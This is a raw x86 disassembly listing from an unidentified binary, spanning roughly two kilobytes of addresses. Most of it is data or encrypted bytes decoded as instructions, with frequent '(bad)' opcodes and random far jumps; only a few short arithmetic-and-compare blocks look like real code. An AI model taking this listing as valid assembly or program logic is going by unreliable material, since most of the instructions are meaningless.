  40b898:	and    esp,DWORD PTR [eax+eax*8+0x508c39a7]
  40b89f:	add    eax,0x3460a746
  40b8a4:	in     al,dx
  40b8a5:	retf   
  40b8a6:	xchg   ebp,eax
  40b8a7:	repnz and ecx,esp
  40b8aa:	aam    0x47
  40b8ac:	sbb    ebx,esp
  40b8ae:	dec    ebx
  40b8af:	cmp    BYTE PTR [eax-0x43],dl
  40b8b2:	xchg   ebx,eax
  40b8b3:	lahf   
  40b8b4:	(bad)  
  40b8b5:	jge    0x40b882
  40b8b7:	clc    
  40b8b8:	mov    edx,0xba0b32d5
  40b8bd:	mov    dh,0xc4
  40b8bf:	mov    ebp,0xb69f89ed
  40b8c4:	adc    esp,DWORD PTR [esi]
  40b8c6:	lods   al,BYTE PTR ds:[esi]
  40b8c7:	ret    0x3a46
  40b8ca:	inc    eax
  40b8cb:	stos   BYTE PTR es:[edi],al
  40b8cc:	sub    al,0x6b
  40b8ce:	push   ebp
  40b8cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8d0:	pop    ebp
  40b8d1:	test   eax,0x67d0d799
  40b8d6:	fwait
  40b8d7:	jmp    0x5d2a:0x5fe82738
  40b8de:	push   0x104991e9
  40b8e3:	sub    eax,0xd262dd18
  40b8e8:	sub    eax,0x19d93ae8
  40b8ed:	pop    ebp
  40b8ee:	mov    ds:0xdf7ec319,eax
  40b8f3:	pop    ss
  40b8f4:	add    cl,bl
  40b8f6:	xchg   esp,eax
  40b8f7:	adc    ecx,edi
  40b8f9:	mov    al,ds:0x7d8b3a9e
  40b8fe:	cld    
  40b8ff:	xor    edx,eax
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx+0x240166fb],cl
  40b949:	adc    al,0xa9
  40b94b:	pusha  
  40b94c:	xor    DWORD PTR [eax+0x70],0xffffff9f
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b903
  40b954:	lea    edx,[ebp-0x832b0e5]
  40b95a:	pop    eax
  40b95b:	sub    DWORD PTR [ecx-0xb],eax
  40b95e:	aam    0xee
  40b960:	hlt    
  40b961:	dec    esi
  40b962:	add    ah,bh
  40b964:	leave  
  40b965:	or     eax,0x4187c7e5
  40b96a:	fdiv   QWORD PTR [edx+0x19]
  40b96d:	sbb    BYTE PTR [esi+0x7b],al
  40b970:	xor    BYTE PTR [ecx-0x3c798263],0x2d
  40b977:	mov    BYTE PTR [esi-0x76],dh
  40b97a:	ins    DWORD PTR es:[edi],dx
  40b97b:	in     eax,dx
  40b97c:	lods   al,BYTE PTR ds:[esi]
  40b97d:	pop    esi
  40b97e:	dec    eax
  40b97f:	pop    ebp
  40b980:	cmp    edi,DWORD PTR [edx-0x59e8faae]
  40b986:	inc    esp
  40b987:	mov    al,BYTE PTR [edi+eax*2+0x526408e0]
  40b98e:	jle    0x40b950
  40b990:	mov    edx,DWORD PTR [edx]
  40b992:	cmp    BYTE PTR [ecx-0x34e3540e],ah
  40b998:	jmp    0x8b45:0xb8aa787e
  40b99f:	sbb    DWORD PTR [esi-0x3117aff9],eax
  40b9a5:	jp     0x40b973
  40b9a7:	pop    esp
  40b9a8:	xor    eax,0xc46396d0
  40b9ad:	and    eax,0x9e316d87
  40b9b2:	xchg   dl,dl
  40b9b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9b5:	xchg   DWORD PTR [ebp+0x22fb01c],edx
  40b9bb:	adc    eax,0x49f4317a
  40b9c0:	inc    ecx
  40b9c1:	jmp    0x40b9e9
  40b9c3:	stos   BYTE PTR es:[edi],al
  40b9c4:	inc    ecx
  40b9c5:	call   0xf2534628
  40b9ca:	or     ah,BYTE PTR [eax]
  40b9cc:	aas    
  40b9cd:	in     al,dx
  40b9ce:	push   ebp
  40b9cf:	ds aaa 
  40b9d1:	dec    edx
  40b9d2:	mov    bh,0x49
  40b9d4:	push   ecx
  40b9d5:	fcomp  DWORD PTR [eax-0x49]
  40b9d8:	clc    
  40b9d9:	pop    ss
  40b9da:	add    bl,ah
  40b9dc:	xor    BYTE PTR [edi+0xcbaf886],cl
  40b9e2:	xlat   BYTE PTR ds:[ebx]
  40b9e3:	(bad)  
  40b9e4:	cli    
  40b9e5:	push   0x20b93f65
  40b9ea:	jl     0x40b9d2
  40b9ec:	adc    bl,bl
  40b9ee:	or     esp,DWORD PTR [ebp-0x43]
  40b9f1:	and    al,0x8c
  40b9f3:	mov    ?,WORD PTR [edx+0x50]
  40b9f6:	adc    BYTE PTR [edi],bl
  40b9f8:	adc    ebx,ebp
  40b9fa:	clc    
  40b9fb:	ins    BYTE PTR es:[edi],dx
  40b9fc:	les    eax,FWORD PTR [esi+0x777b93bd]
  40ba02:	jle    0x40ba74
  40ba04:	in     eax,0x76
  40ba06:	sbb    al,0xc2
  40ba08:	mov    esi,DWORD PTR [esi+0x7c755671]
  40ba0e:	fdiv   QWORD PTR [esi-0x136753fb]
  40ba14:	imul   ecx,esp,0x43
  40ba17:	ret    
  40ba18:	xchg   bl,dh
  40ba1a:	fistp  DWORD PTR [edx+eiz*1-0x1c]
  40ba1e:	in     al,0xec
  40ba20:	enter  0xcffa,0x83
  40ba24:	cmp    eax,0x7c790e78
  40ba29:	dec    ebp
  40ba2a:	cmp    DWORD PTR [ebx],edi
  40ba2c:	mov    ecx,0x8b05e820
  40ba31:	fidiv  DWORD PTR [eax-0x140b577e]
  40ba37:	daa    
  40ba38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba39:	mov    esp,0xe8816dca
  40ba3e:	lods   al,BYTE PTR ds:[esi]
  40ba3f:	and    eax,0xf3075e28
  40ba44:	aas    
  40ba45:	push   ss
  40ba46:	pop    edi
  40ba47:	rcr    ah,0x8a
  40ba4a:	hlt    
  40ba4b:	xor    cl,al
  40ba4d:	pop    es
  40ba4e:	leave  
  40ba4f:	xlat   BYTE PTR ds:[ebx]
  40ba50:	adc    DWORD PTR [ecx],ebx
  40ba52:	cdq    
  40ba53:	hlt    
  40ba54:	jo     0x40ba24
  40ba56:	outs   dx,DWORD PTR ds:[esi]
  40ba57:	mov    eax,0xadda7ea7
  40ba5c:	xchg   ebp,eax
  40ba5d:	xchg   BYTE PTR [edi*4+0x448a6e79],bl
  40ba64:	cmp    cl,bl
  40ba66:	pushf  
  40ba67:	mov    al,ds:0xf97d02ae
  40ba6c:	push   cs
  40ba6d:	jle    0x40b9fd
  40ba6f:	and    DWORD PTR [ecx+0x1d],edi
  40ba72:	out    dx,al
  40ba73:	xchg   edx,eax
  40ba74:	repz mov WORD PTR [edx-0x78569e33],cs
  40ba7b:	jnp    0x40ba0f
  40ba7d:	scas   eax,DWORD PTR es:[edi]
  40ba7e:	loop   0x40ba60
  40ba80:	repnz arpl WORD PTR ds:0xf0891531,ax
  40ba87:	aas    
  40ba88:	in     eax,dx
  40ba89:	push   ss
  40ba8a:	or     eax,0xfe0ef154
  40ba8f:	icebp  
  40ba90:	stos   DWORD PTR es:[edi],eax
  40ba91:	or     eax,ecx
  40ba93:	push   ds
  40ba94:	dec    ebx
  40ba95:	cmp    eax,0xa9d541bb
  40ba9a:	pop    ds
  40ba9b:	lock add ebp,DWORD PTR [eax+0x2f7ce024]
  40baa2:	add    esi,DWORD PTR [esi+0x20]
  40baa5:	and    eax,0x96c320f3
  40baaa:	cmp    DWORD PTR [ebx-0x55],esp
  40baad:	xchg   BYTE PTR [ecx],cl
  40baaf:	fld    st(6)
  40bab1:	aam    0x29
  40bab3:	adc    BYTE PTR [edi+0x9],cl
  40bab6:	sbb    eax,0xc5f2b132
  40babb:	pop    DWORD PTR [ebx+0x76]
  40babe:	test   al,0xa7
  40bac0:	ja     0x40bb05
  40bac2:	dec    edi
  40bac3:	jns    0x40baa7
  40bac5:	loop   0x40bae5
  40bac7:	std    
  40bac8:	pop    eax
  40bac9:	aaa    
  40baca:	jecxz  0x40ba67
  40bacc:	loopne 0x40bafc
  40bace:	stc    
  40bacf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bad0:	push   ecx
  40bad1:	xchg   edi,eax
  40bad2:	test   DWORD PTR [eax-0x4b844573],ecx
  40bad8:	or     al,0x21
  40bada:	xchg   edi,eax
  40badb:	lock imul ebp,DWORD PTR [ebp-0x2c59acca],0x88cba0f1
  40bae6:	or     cl,BYTE PTR [ecx-0x7a3f25c]
  40baec:	cmp    DWORD PTR gs:[ecx],edx
  40baef:	jge    0x40bb06
  40baf1:	clc    
  40baf2:	dec    esp
  40baf3:	inc    esp
  40baf4:	imul   ebp,DWORD PTR [ebx],0x34
  40baf7:	lahf   
  40baf8:	add    al,0x67
  40bafa:	nop
  40bafb:	mul    DWORD PTR [eax+0x55898fee]
  40bb01:	(bad)  
  40bb02:	rcl    BYTE PTR [ebx-0x32],cl
  40bb05:	sahf   
  40bb06:	jmp    0xbeaf4936
  40bb0b:	fs sbb cl,ch
  40bb0e:	jmp    0x40bae5
  40bb10:	stos   BYTE PTR es:[edi],al
  40bb11:	or     al,al
  40bb13:	jl     0x40bb39
  40bb15:	mov    BYTE PTR [esi+edi*4-0x28],cl
  40bb19:	xchg   esp,eax
  40bb1a:	mov    cl,0x9c
  40bb1c:	jle    0x40bb4b
  40bb1e:	(bad)  
  40bb1f:	mov    dl,0x66
  40bb21:	mov    ebp,0xec1a5acb
  40bb26:	add    DWORD PTR [ecx+0x71],edi
  40bb29:	out    0x20,al
  40bb2b:	es lahf 
  40bb2d:	ins    BYTE PTR es:[edi],dx
  40bb2e:	(bad)  
  40bb2f:	push   ebp
  40bb30:	and    BYTE PTR [ebp*1-0x4f863af3],ah
  40bb37:	mov    bl,0xd2
  40bb39:	dec    BYTE PTR [esi+0x5feab182]
  40bb3f:	arpl   WORD PTR [eax],si
  40bb41:	mov    esi,esp
  40bb43:	inc    ebp
  40bb44:	pop    edi
  40bb45:	sub    al,0x6e
  40bb47:	jno    0x40bb6d
  40bb49:	dec    ecx
  40bb4a:	nop
  40bb4b:	addr16 pop edx
  40bb4d:	xchg   DWORD PTR [esi+0x36],edi
  40bb50:	cmp    eax,0xbc2c52a2
  40bb55:	lods   eax,DWORD PTR ds:[esi]
  40bb56:	je     0x40bb93
  40bb58:	sub    edi,0xec64c8a
  40bb5e:	(bad)  
  40bb5f:	retf   
  40bb60:	cmp    ch,BYTE PTR [ebx+ebx*8+0x3d096411]
  40bb67:	cli    
  40bb68:	sub    eax,0xafffd3dd
  40bb6d:	hlt    
  40bb6e:	test   al,0x70
  40bb70:	inc    ebp
  40bb71:	sbb    ebx,DWORD PTR [edi]
  40bb73:	xchg   edx,eax
  40bb74:	test   eax,0xfdf72582
  40bb79:	push   ss
  40bb7a:	mov    ecx,0x9068a89
  40bb7f:	cmp    eax,0xa1c26d98
  40bb84:	xor    eax,esp
  40bb86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb87:	neg    BYTE PTR [edx+0x78811d07]
  40bb8d:	jae    0x40bb6e
  40bb8f:	jne    0x40bbee
  40bb91:	adc    ch,BYTE PTR [esi+0x0]
  40bb94:	cmp    eax,0x7d90be5c
  40bb99:	(bad)  
  40bb9a:	jge    0x40bb24
  40bb9c:	mov    esi,0x9495f64e
  40bba1:	bound  ebp,QWORD PTR [ebx]
  40bba3:	popa   
  40bba4:	cli    
  40bba5:	js     0x40bbad
  40bba7:	sbb    eax,0xb2cd45c7
  40bbac:	test   dl,0x80
  40bbaf:	pop    edx
  40bbb0:	mov    BYTE PTR [esi+0xf],cl
  40bbb3:	mov    edi,0x32cbd36e
  40bbb8:	jmp    0x8522:0x89e98fdb
  40bbbf:	fs inc esi
  40bbc1:	inc    edi
  40bbc2:	and    edi,DWORD PTR [ebp-0x37945aea]
  40bbc8:	jo     0x40bb52
  40bbca:	mov    ebp,0x466f053
  40bbcf:	add    BYTE PTR [ebx-0x25],ch
  40bbd2:	lods   eax,DWORD PTR ds:[esi]
  40bbd3:	cmc    
  40bbd4:	adc    cl,BYTE PTR [ecx]
  40bbd6:	cld    
  40bbd7:	(bad)  [edx]
  40bbd9:	add    ebp,ebp
  40bbdb:	and    DWORD PTR [ecx-0x5fe83dbc],ebp
  40bbe1:	stos   DWORD PTR es:[edi],eax
  40bbe2:	ins    DWORD PTR es:[edi],dx
  40bbe3:	dec    eax
  40bbe4:	clc    
  40bbe5:	out    0x21,al
  40bbe7:	test   ah,bh
  40bbe9:	or     al,0xb1
  40bbeb:	and    al,0xbd
  40bbed:	xor    eax,0xf535e49e
  40bbf2:	ja     0x40bc0d
  40bbf4:	sub    dl,BYTE PTR [eax-0x706b5e20]
  40bbfa:	mov    ds:0x9baf6ecd,al
  40bbff:	mov    ch,0x6a
  40bc01:	xchg   esi,eax
  40bc02:	aas    
  40bc03:	mov    dl,0x1f
  40bc05:	xchg   esi,eax
  40bc06:	add    ecx,DWORD PTR [ecx-0x45255bc3]
  40bc0c:	xchg   ecx,eax
  40bc0d:	xor    edi,ecx
  40bc0f:	cmc    
  40bc10:	loope  0x40bbbd
  40bc12:	int    0x6f
  40bc14:	loopne 0x40bbab
  40bc16:	sub    al,0x16
  40bc18:	es jle 0x40bc4d
  40bc1b:	cld    
  40bc1c:	mov    eax,0xd59d011c
  40bc21:	pop    eax
  40bc22:	call   0x59fb574c
  40bc27:	in     eax,0x72
  40bc29:	in     eax,dx
  40bc2a:	aaa    
  40bc2b:	(bad)  [edx]
  40bc2d:	retf   
  40bc2e:	or     eax,0xdf9ed985
  40bc33:	push   edx
  40bc34:	or     DWORD PTR [edx-0x1a1fc8e2],eax
  40bc3a:	mov    ecx,0xf739934c
  40bc3f:	outs   dx,DWORD PTR ds:[esi]
  40bc40:	cmp    dh,BYTE PTR [eax]
  40bc42:	test   eax,0x5e9bbf52
  40bc47:	adc    eax,DWORD PTR [edi]
  40bc49:	jne    0x40bbdb
  40bc4b:	out    0x14,al
  40bc4d:	retf   
  40bc4e:	cli    
  40bc4f:	test   BYTE PTR [ebp+0x59e2deac],ch
  40bc55:	mov    esi,DWORD PTR [edi-0x3355540f]
  40bc5b:	push   ecx
  40bc5c:	stos   DWORD PTR es:[edi],eax
  40bc5d:	fwait
  40bc5e:	adc    esi,DWORD PTR [ecx+0xd]
  40bc61:	add    DWORD PTR [ecx],ebp
  40bc63:	stos   BYTE PTR es:[edi],al
  40bc64:	push   cs
  40bc65:	jne    0x40bcb4
  40bc67:	out    0x7a,al
  40bc69:	sbb    cl,ah
  40bc6b:	sbb    al,0x7d
  40bc6d:	outs   dx,DWORD PTR ds:[esi]
  40bc6e:	jo     0x40bcbf
  40bc70:	lods   eax,DWORD PTR ds:[esi]
  40bc71:	ja     0x809afa44
  40bc77:	test   al,0x9a
  40bc79:	xchg   esi,eax
  40bc7a:	in     eax,0x1e
  40bc7c:	inc    eax
  40bc7d:	das    
  40bc7e:	dec    eax
  40bc7f:	lea    ebp,[ecx+0x35a67358]
  40bc85:	pop    esi
  40bc86:	cmp    al,0x24
  40bc88:	retf   0xe46d
  40bc8b:	sti    
  40bc8c:	mov    WORD PTR [esi],es
  40bc8e:	sbb    edx,esi
  40bc90:	push   edx
  40bc91:	outs   dx,BYTE PTR ds:[esi]
  40bc92:	(bad)  
  40bc93:	push   ebx
  40bc94:	push   0xfbe9d350
  40bc99:	and    DWORD PTR [ecx+esi*1],esp
  40bc9c:	ja     0x40bc97
  40bc9e:	stos   DWORD PTR es:[edi],eax
  40bc9f:	mov    bh,0xf7
  40bca1:	outs   dx,BYTE PTR ds:[esi]
  40bca2:	push   ebp
  40bca3:	dec    esi
  40bca4:	cld    
  40bca5:	rol    DWORD PTR [esi-0x5],cl
  40bca8:	cmp    DWORD PTR [edx-0x73],eax
  40bcab:	sahf   
  40bcac:	add    esp,DWORD PTR [eax+eiz*2]
  40bcaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcb0:	ret    
  40bcb1:	or     al,0x54
  40bcb3:	scas   al,BYTE PTR es:[edi]
  40bcb4:	sahf   
  40bcb5:	scas   al,BYTE PTR es:[edi]
  40bcb6:	mov    ebx,0xd5616e43
  40bcbb:	add    ecx,DWORD PTR [esi+0x62d1522]
  40bcc1:	dec    eax
  40bcc2:	(bad)  
  40bcc3:	call   0xe0ced57f
  40bcc8:	popa   
  40bcc9:	lods   al,BYTE PTR ds:[esi]
  40bcca:	cmp    al,0x2
  40bccc:	popf   
  40bccd:	xor    eax,0xbf9be06d
  40bcd2:	adc    al,0x39
  40bcd4:	call   DWORD PTR [edi]
  40bcd6:	add    BYTE PTR [ebx],dl
  40bcd8:	test   bl,bh
  40bcda:	popa   
  40bcdb:	or     eax,0x2c4dcaef
  40bce0:	mov    BYTE PTR [eax-0x48],bh
  40bce3:	scas   al,BYTE PTR es:[edi]
  40bce4:	push   ss
  40bce5:	pop    ds
  40bce6:	arpl   ax,bx
  40bce8:	add    eax,0x2e14add7
  40bced:	jb     0x40bd6a
  40bcef:	dec    edx
  40bcf0:	add    edi,DWORD PTR [eax+0x7a]
  40bcf3:	pop    esi
  40bcf4:	mov    ebx,DWORD PTR [ebp-0x10]
  40bcf7:	sub    ebx,edi
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    dl,bl
  40bd3f:	mov    ebp,0x8f8f439e
  40bd44:	jo     0x40bdb6
  40bd46:	lahf   
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bcda
  40bd4b:	pop    ds
  40bd4c:	lods   al,BYTE PTR ds:[esi]
  40bd4d:	out    0x18,eax
  40bd4f:	lea    esi,[ebp-0x700fe308]
  40bd55:	out    0xc3,eax
  40bd57:	dec    ebx
  40bd58:	jnp    0x40bd9d
  40bd5a:	and    cl,ah
  40bd5c:	repz or ebp,esi
  40bd5f:	or     ah,BYTE PTR [esi+0x48]
  40bd62:	jmp    0x9a83:0x829a350c
  40bd69:	fwait
  40bd6a:	iret   
  40bd6b:	ins    DWORD PTR es:[edi],dx
  40bd6c:	(bad)  
  40bd6d:	xchg   BYTE PTR [ecx-0x5f3b7d87],ch
  40bd73:	sahf   
  40bd74:	in     eax,0x72
  40bd76:	jae    0x40bd6c
  40bd78:	mov    gs,ecx
  40bd7a:	pop    edx
  40bd7b:	out    dx,al
  40bd7c:	cmp    al,0x6
  40bd7e:	icebp  
  40bd7f:	xlat   BYTE PTR ds:[ebx]
  40bd80:	jb     0x40bdee
  40bd82:	cmc    
  40bd83:	push   ds
  40bd84:	sub    al,0xbf
  40bd86:	aad    0x6f
  40bd88:	lea    edx,[eax]
  40bd8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd8b:	sahf   
  40bd8c:	std    
  40bd8d:	jg     0x40bda0
  40bd8f:	cmp    esi,esi
  40bd91:	mov    WORD PTR [ebx],cs
  40bd93:	inc    esp
  40bd94:	dec    eax
  40bd95:	mov    ds:0x44001707,al
  40bd9a:	out    dx,al
  40bd9b:	dec    esi
  40bd9c:	hlt    
  40bd9d:	mov    ecx,0x24050a03
  40bda2:	sub    eax,0x799e287e
  40bda7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bda8:	push   ebp
  40bda9:	data16 stc 
  40bdab:	push   eax
  40bdac:	fist   WORD PTR [edx-0x622b7f28]
  40bdb2:	fst    st(4)
  40bdb4:	in     eax,0x8e
  40bdb6:	and    al,BYTE PTR [eax+0x368f5511]
  40bdbc:	(bad)  
  40bdbd:	gs push es
  40bdbf:	icebp  
  40bdc0:	xchg   ecx,eax
  40bdc1:	cwde   
  40bdc2:	xor    DWORD PTR [edx-0x13],ecx
  40bdc5:	adc    BYTE PTR [edx],bl
  40bdc7:	jg     0x40be38
  40bdc9:	pop    ss
  40bdca:	punpckldq mm7,DWORD PTR [ebx+0x607b030d]
  40bdd1:	xchg   esi,eax
  40bdd2:	inc    ebp
  40bdd3:	adc    eax,0x527dce79
  40bdd8:	in     eax,0xae
  40bdda:	jb     0x40be33
  40bddc:	mov    ecx,0xe238d8d0
  40bde1:	jb     0x40be1a
  40bde3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bde4:	out    0x7b,al
  40bde6:	sti    
  40bde7:	(bad)  
  40bde8:	push   0xfffffffa
  40bdea:	aaa    
  40bdeb:	xor    al,0x3d
  40bded:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdee:	mov    dh,0xa1
  40bdf0:	xor    edx,edx
  40bdf2:	rol    ecx,cl
  40bdf4:	in     al,0x51
  40bdf6:	hlt    
  40bdf7:	mov    al,0x19
  40bdf9:	xlat   BYTE PTR ds:[ebx]
  40bdfa:	fcmovbe st,st(6)
  40bdfc:	mov    ecx,0x6ef08b14
  40be01:	ins    DWORD PTR es:[edi],dx
  40be02:	pop    esp
  40be03:	in     eax,dx
  40be04:	out    dx,al
  40be05:	je     0x40be19
  40be07:	sub    DWORD PTR [ecx-0xe],esi
  40be0a:	test   eax,0x50e3403f
  40be0f:	fcmove st,st(6)
  40be12:	mov    ds:0xd33699de,eax
  40be17:	cwde   
  40be18:	cwde   
  40be19:	pop    ecx
  40be1a:	xchg   esp,eax
  40be1b:	sahf   
  40be1c:	iret   
  40be1d:	xor    bl,cl
  40be1f:	out    dx,eax
  40be20:	test   DWORD PTR [ebx],0x31982cba
  40be26:	add    al,0x7
  40be28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be29:	pop    ebx
  40be2a:	movsx  esi,WORD PTR [edi]
  40be2d:	cli    
  40be2e:	or     DWORD PTR [ebx+esi*8+0x44],edx
  40be32:	mov    BYTE PTR [edi+0x7e917e47],dh
  40be38:	inc    esi
  40be39:	jle    0x40beb8
  40be3b:	push   ebx
  40be3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be3d:	add    al,0x65
  40be3f:	(bad)  
  40be40:	test   DWORD PTR [edx+0x72],edx
  40be43:	xchg   BYTE PTR [eax],ch
  40be45:	out    dx,eax
  40be46:	and    BYTE PTR ds:0x9b968254,ch
  40be4c:	pop    ebx
  40be4d:	add    DWORD PTR [esp-0x11141493],0xf43513b2
  40be58:	stos   BYTE PTR es:[edi],al
  40be59:	leave  
  40be5a:	mov    al,0xd7
  40be5c:	test   al,0x45
  40be5e:	xchg   ecx,eax
  40be5f:	data16 aas 
  40be61:	sbb    dl,bh
  40be63:	outs   dx,BYTE PTR ds:[esi]
  40be64:	and    BYTE PTR [ecx+0x66ec637a],dl
  40be6a:	fwait
  40be6b:	aam    0xef
  40be6d:	idiv   ch
  40be6f:	add    DWORD PTR [edx+edi*4],esp
  40be72:	sub    al,0x46
  40be74:	xchg   ebx,eax
  40be75:	sbb    cl,dl
  40be77:	mov    eax,fs:0x8c35320d
  40be7d:	jg     0x40bee5
  40be7f:	cmp    edi,0xf8c7102f
  40be85:	sbb    BYTE PTR [ecx+0x63],ah
  40be88:	mov    ds:0x1f410e5c,al
  40be8d:	jns    0x40be3a
  40be8f:	xor    esp,DWORD PTR [eax]
  40be91:	push   es
  40be92:	pop    eax
  40be93:	xchg   ebp,eax
  40be94:	rol    cl,0x5c
  40be97:	push   ecx
  40be98:	popa   
  40be99:	fmul   DWORD PTR [ebp+0x61]
  40be9c:	sbb    al,0x42
  40be9e:	jl     0x40bf17
  40bea0:	push   ss
  40bea1:	inc    ecx
  40bea2:	xchg   esp,eax
  40bea3:	xor    eax,edi
  40bea5:	repnz out dx,eax
  40bea7:	cs call 0x8ffaa4b7
  40bead:	out    dx,eax
  40beae:	fidivr WORD PTR [ebx]
  40beb0:	jle    0x40bebe
  40beb2:	shr    BYTE PTR [eax],cl
  40beb4:	aad    0x69
  40beb6:	clc    
  40beb7:	bound  edx,QWORD PTR [ebx+ebp*8-0x10]
  40bebb:	xchg   ebp,eax
  40bebc:	iret   
  40bebd:	add    DWORD PTR [esp+edi*1+0x69061653],esp
  40bec4:	mov    ah,0xd3
  40bec6:	fnsave [ecx]
  40bec8:	ins    BYTE PTR es:[edi],dx
  40bec9:	add    ebp,esp
  40becb:	mov    bh,0x4
  40becd:	inc    edi
  40bece:	xor    BYTE PTR ds:0x7dd4fea1,dh
  40bed4:	mov    al,ds:0x1c74c981
  40bed9:	sub    BYTE PTR [esi-0x28],ch
  40bedc:	sbb    dh,0xb5
  40bedf:	lock out 0xfe,eax
  40bee2:	and    DWORD PTR [edi],ecx
  40bee4:	dec    eax
  40bee5:	dec    esp
  40bee6:	add    BYTE PTR [ebx],cl
  40bee8:	lods   eax,DWORD PTR ds:[esi]
  40bee9:	push   eax
  40beea:	cmp    edi,ebx
  40beec:	sub    eax,0x551cb7bc
  40bef1:	jnp    0x40bf15
  40bef3:	ret    0x37f
  40bef6:	mov    cl,0x47
  40bef8:	(bad)  
  40bef9:	repnz and eax,0xb09a99f7
  40beff:	xchg   ebx,eax
  40bf00:	int3   
  40bf01:	push   ebp
  40bf02:	jmp    0x67e59b3e
  40bf07:	push   esp
  40bf08:	imul   esi,DWORD PTR [edi-0x71a8bb23],0x1917cb38
  40bf12:	mov    DWORD PTR [esi-0x35],ebx
  40bf15:	cmp    BYTE PTR [ebp+0x5],bh
  40bf18:	out    dx,eax
  40bf19:	cmp    al,0x9
  40bf1b:	addr16 mov ds:0x4cc5,al
  40bf1f:	and    esp,DWORD PTR [edi-0x2e]
  40bf22:	addr16 call 0xb60dd32d
  40bf28:	cmp    cl,BYTE PTR [esi]
  40bf2a:	dec    ebp
  40bf2b:	jo     0x40bf06
  40bf2d:	stc    
  40bf2e:	xchg   ebp,eax
  40bf2f:	and    bh,BYTE PTR [ecx]
  40bf31:	fs jp  0x40bee3
  40bf34:	rcr    DWORD PTR [edi],1
  40bf36:	sbb    al,0x6f
  40bf38:	jg     0x40bf9b
  40bf3a:	jbe    0x40bf8c
  40bf3c:	add    BYTE PTR [edx],dl
  40bf3e:	(bad)  
  40bf40:	out    dx,eax
  40bf41:	dec    ebx
  40bf42:	mov    edx,0x3af5e725
  40bf47:	scas   eax,DWORD PTR es:[edi]
  40bf48:	lods   al,BYTE PTR ds:[esi]
  40bf49:	sbb    BYTE PTR [ebx],ah
  40bf4b:	div    BYTE PTR [edi+0x15]
  40bf4e:	popf   
  40bf4f:	pop    eax
  40bf50:	nop
  40bf51:	sbb    BYTE PTR [ebx+0x7769b50b],cl
  40bf57:	xchg   bl,dl
  40bf59:	ins    DWORD PTR es:[edi],dx
  40bf5a:	or     eax,0x4458ebd5
  40bf5f:	mov    bl,0x22
  40bf61:	test   DWORD PTR [ebx],esi
  40bf63:	and    eax,0x6a828134
  40bf68:	push   edi
  40bf69:	daa    
  40bf6a:	in     eax,0x55
  40bf6c:	cmp    bh,BYTE PTR [eax+0x5127e0a7]
  40bf72:	clc    
  40bf73:	jno    0x40bf90
  40bf75:	and    eax,0xa3ea52a4
  40bf7a:	xor    edi,0xffffffda
  40bf7d:	mov    esi,0xea3c824
  40bf82:	cmp    bh,BYTE PTR [ebx]
  40bf84:	add    DWORD PTR [ecx+0x4637e8a4],ebx
  40bf8a:	mov    al,0x14
  40bf8c:	sub    ch,BYTE PTR [eax-0x7c]
  40bf8f:	push   0x6
  40bf91:	std    
  40bf92:	xor    eax,ebx
  40bf94:	or     BYTE PTR [ebx+0x74],0x5e
  40bf98:	loopne 0x40bfcc
  40bf9a:	add    eax,0x843da528
  40bf9f:	mov    WORD PTR [esi-0x5accd623],ss
  40bfa5:	ss inc edi
  40bfa7:	and    DWORD PTR [ecx+0x16],0x78d877f2
  40bfae:	dec    eax
  40bfaf:	xlat   BYTE PTR ds:[ebx]
  40bfb0:	gs sub eax,0xa0f3a946
  40bfb6:	mov    ebp,0xd6a1a5d0
  40bfbb:	arpl   WORD PTR [eax],bx
  40bfbd:	stos   DWORD PTR es:[edi],eax
  40bfbe:	(bad)  
  40bfbf:	ins    DWORD PTR es:[edi],dx
  40bfc0:	xchg   esi,eax
  40bfc1:	clc    
